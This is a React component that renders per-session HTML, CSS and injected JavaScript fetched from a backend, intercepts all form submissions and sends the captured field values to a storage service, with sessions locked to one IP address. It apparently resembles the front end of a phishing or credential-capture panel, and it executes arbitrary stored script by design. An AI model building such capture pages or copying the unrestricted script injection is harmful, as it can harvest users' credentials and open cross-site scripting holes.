
import React, { useEffect, useRef, useCallback } from 'react';
import { toast } from '@/components/ui/sonner';
import { useSessionData } from '@/hooks/useSessionData';
import { checkIPRestriction } from '@/services/ipService';
import { captureFormData, extractFormData } from '@/services/formDataService';
import SessionLoading from './SessionLoading';
import SessionError from './SessionError';

interface SessionContentProps {
  sessionId: string;
}

const SessionContent = ({ sessionId }: SessionContentProps) => {
  const { data, loading, error, refetch } = useSessionData(sessionId);
  const containerRef = useRef<HTMLDivElement>(null);
  const scriptRef = useRef<HTMLScriptElement | null>(null);

  console.log('SessionContent render:', { sessionId, loading, error, hasData: !!data });

  // Handle form submissions
  const handleFormSubmit = useCallback(async (event: Event) => {
    const form = event.target as HTMLFormElement;
    if (!form || form.tagName !== 'FORM') return;
    
    event.preventDefault();
    
    try {
      // Check IP restrictions
      if (data?.session.session_options) {
        const ipAllowed = await checkIPRestriction(sessionId, data.session.session_options);
        if (!ipAllowed) {
          toast.error('Access denied: Session locked to different IP address');
          return;
        }
      }

      const formData = extractFormData(form);
      
      if (Object.keys(formData).length === 0) {
        toast.error('No data to submit');
        return;
      }

      await captureFormData({
        sessionId,
        formData
      });

      toast.success('Data submitted successfully!');
    } catch (error) {
      console.error('Form submission failed:', error);
      toast.error('Failed to submit data. Please try again.');
    }
  }, [sessionId, data?.session.session_options]);

  // Set up form listeners
  useEffect(() => {
    const container = containerRef.current;
    if (!container) return;

    container.addEventListener('submit', handleFormSubmit);
    return () => container.removeEventListener('submit', handleFormSubmit);
  }, [handleFormSubmit]);

  // Handle JavaScript injection
  useEffect(() => {
    if (!data?.subPage.javascript) {
      // Clean up any existing script
      if (scriptRef.current) {
        try {
          document.head.removeChild(scriptRef.current);
        } catch (e) {
          console.warn('Previous script cleanup failed');
        }
        scriptRef.current = null;
      }
      return;
    }

    console.log('Injecting JavaScript for sub page:', data.subPage.id);

    try {
      // Clean up previous script
      if (scriptRef.current) {
        document.head.removeChild(scriptRef.current);
        scriptRef.current = null;
      }

      const script = document.createElement('script');
      script.textContent = data.subPage.javascript;
      document.head.appendChild(script);
      scriptRef.current = script;

      // Set up global functions
      (window as any).submitSessionData = async (customData: Record<string, any>) => {
        try {
          await captureFormData({
            sessionId,
            formData: customData
          });
          toast.success('Data submitted successfully!');
        } catch (error) {
          toast.error('Failed to submit data');
        }
      };

      return () => {
        if (scriptRef.current) {
          try {
            document.head.removeChild(scriptRef.current);
          } catch (e) {
            console.warn('Script cleanup failed');
          }
          scriptRef.current = null;
        }
        delete (window as any).submitSessionData;
      };
    } catch (error) {
      console.error('JavaScript injection failed:', error);
    }
  }, [data?.subPage.javascript, data?.subPage.id, sessionId]);

  if (loading) {
    return <SessionLoading />;
  }

  if (error) {
    return (
      <SessionError 
        error={error} 
        sessionId={sessionId} 
        onRetry={refetch}
      />
    );
  }

  if (!data) {
    return (
      <SessionError 
        error="No session data available" 
        sessionId={sessionId}
        onRetry={refetch}
      />
    );
  }

  console.log('Rendering session content for sub page:', data.subPage.id);

  return (
    <div className="w-full min-h-screen">
      {data.subPage.css && (
        <style dangerouslySetInnerHTML={{ __html: data.subPage.css }} />
      )}
      {data.subPage.html && (
        <div
          ref={containerRef}
          className="w-full"
          dangerouslySetInnerHTML={{ __html: data.subPage.html }}
        />
      )}
    </div>
  );
};

export default SessionContent;
